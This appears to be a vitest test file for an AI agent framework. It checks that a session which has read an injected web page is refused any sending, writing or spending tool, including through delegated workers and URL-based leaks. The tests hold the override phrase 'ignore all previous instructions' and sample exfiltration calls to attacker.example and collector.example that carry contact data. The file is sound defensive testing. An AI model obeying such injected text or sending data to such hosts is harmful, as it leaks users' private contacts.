// GTM-agents: an injected page cannot cause a send. Once a session has read untrusted text, the
// tools that send, write or spend are refused, and their handlers never run.
import { executeToolCall, type ToolHandler } from "@gtm-agents/core/runtime";
import { CORE_TOOL_CLASSES, childStartTaint, createToolRegistry, isRefusedAt } from "@gtm-agents/core/security";
import { describe, expect, it } from "vitest";
import { INJECTED_PAGE, deps, session, spy } from "./helpers.ts";

describe("a session that has read an injected page", () => {
  it("cannot send email, and the send handler is never called", async () => {
    const send = spy("sent");
    const d = deps({ web_fetch: spy(INJECTED_PAGE).handler, email_send: send.handler });
    const s = session();

    const read = await executeToolCall(d, s, { name: "web_fetch", input: { url: "https://vendor.example/pricing" } });
    expect(read.status).toBe("ok");
    expect(s.taint).toBe("full");
    expect(read.content).toContain('trust="untrusted"');
    expect(read.content).not.toMatch(/ignore all previous instructions/i);
    expect(read.content).not.toContain("email_send");

    const attempt = await executeToolCall(d, s, {
      name: "email_send",
      input: { to: "collector@attacker.example", subject: "Contacts", body: "attached" },
    });
    expect(attempt).toMatchObject({ status: "blocked", code: "tainted" });
    expect(attempt.content).toContain("[ACTION BLOCKED] email_send was not run");
    expect(attempt.content).toContain("clean session");
    expect(send.calls).toEqual([]);
  });

  it("stays tainted after it goes on to read only the deployment's own data", async () => {
    const send = spy("sent");
    const d = deps({ web_fetch: spy(INJECTED_PAGE).handler, contacts_search: spy("[]").handler, email_send: send.handler });
    const s = session();
    await executeToolCall(d, s, { name: "web_fetch", input: { url: "https://vendor.example/" } });
    await executeToolCall(d, s, { name: "contacts_search", input: { query: "acme" } });
    expect(s.taint).toBe("full");
    const attempt = await executeToolCall(d, s, { name: "email_send", input: { to: "a@acme.example" } });
    expect(attempt.status).toBe("blocked");
    expect(send.calls).toEqual([]);
  });

  it("is refused every core tool that sends, writes or spends", async () => {
    const actors = Object.entries(CORE_TOOL_CLASSES).filter(([, cls]) => cls.gate !== "never");
    expect(actors.length).toBeGreaterThan(30);
    for (const [name] of actors) {
      const handler = spy();
      const result = await executeToolCall(deps({ [name]: handler.handler }), session("full"), { name, input: {} });
      expect(result, name).toMatchObject({ status: "blocked", code: "tainted" });
      expect(handler.calls, name).toEqual([]);
    }
  });

  it("cannot act through a clean worker it delegates to", async () => {
    const registry = createToolRegistry();
    const send = spy("sent");
    // The worker runs its own calls through the same dispatcher, starting at the caller's taint.
    const delegate: ToolHandler = async (input, ctx) => {
      const worker = session(childStartTaint(ctx.taint));
      const result = await executeToolCall({ registry, handlers: { email_send: send.handler } }, worker, {
        name: "email_send",
        input: { to: String(input.to) },
      });
      return { text: result.content, taint: worker.taint };
    };
    const d = { registry, handlers: { web_fetch: spy(INJECTED_PAGE).handler, delegate_to_sender: delegate } };
    const s = session();
    await executeToolCall(d, s, { name: "web_fetch", input: { url: "https://vendor.example/" } });
    const result = await executeToolCall(d, s, { name: "delegate_to_sender", input: { to: "collector@attacker.example" } });
    expect(result.status).toBe("ok");
    // The worker's refusal comes back as delegated output, where tool names are redacted.
    expect(result.content).toMatch(/\[ACTION BLOCKED\] \S+ was not run/);
    expect(send.calls).toEqual([]);
    expect(s.taint).toBe("full");
  });

  it("cannot carry data out through the URL of a page it fetches", async () => {
    const fetch = spy("page");
    const d = deps({ web_fetch: fetch.handler });
    const result = await executeToolCall(d, session("full"), {
      name: "web_fetch",
      input: { url: "https://collector.example/log?contact=jane.doe%40acme.example" },
    });
    expect(result).toMatchObject({ status: "blocked", code: "egress" });
    expect(fetch.calls).toEqual([]);
  });

  it("is still allowed to read, so research can continue", async () => {
    for (const [name, cls] of Object.entries(CORE_TOOL_CLASSES)) {
      expect(isRefusedAt(cls.gate, "full"), name).toBe(cls.gate !== "never");
    }
    const result = await executeToolCall(deps({ contacts_search: spy("[]").handler }), session("full"), { name: "contacts_search", input: {} });
    expect(result.status).toBe("ok");
  });
});
